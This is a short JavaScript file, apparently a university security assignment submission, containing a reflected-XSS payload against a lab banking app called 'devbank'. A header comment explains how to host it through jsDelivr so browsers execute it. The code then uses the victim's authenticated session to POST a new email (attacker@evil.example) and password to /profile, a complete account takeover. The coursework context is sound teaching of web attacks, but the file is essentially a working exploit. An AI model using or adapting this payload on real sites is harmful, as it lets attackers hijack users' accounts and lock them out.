/*
 * FIT5003 A2 - Part B.2: externally-hosted reflected-XSS payload.
 *
 * This file is hosted on YOUR OWN GitHub repo and loaded through jsDelivr so it
 * is served with a JavaScript content-type (a raw github.com URL is text/plain
 * + nosniff and will NOT execute):
 *
 *     https://cdn.jsdelivr.net/gh/<your-user>/<your-repo>@main/payload.js
 *
 * It is delivered to a logged-in victim via the reflected sink in /search
 * (see reflected_xss_url.txt). When the victim opens the crafted URL, this
 * script runs in the devbank origin WITH the victim's session cookie, so the
 * fetch() below is automatically authenticated. It performs a full ACCOUNT
 * TAKEOVER by changing the victim's email and password through /profile.
 */
(function () {
  var attackerEmail = "attacker@evil.example";
  var newPassword = "pwned-by-35681659";

  // POST to /profile using the victim's own session (cookies sent automatically).
  fetch("/profile", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    credentials: "include",
    body: "email=" + encodeURIComponent(attackerEmail) +
          "&password=" + encodeURIComponent(newPassword)
  }).then(function () {
    // Proof the payload executed in the victim's context.
    console.log("[payload] account takeover submitted for", document.title);
  });
})();
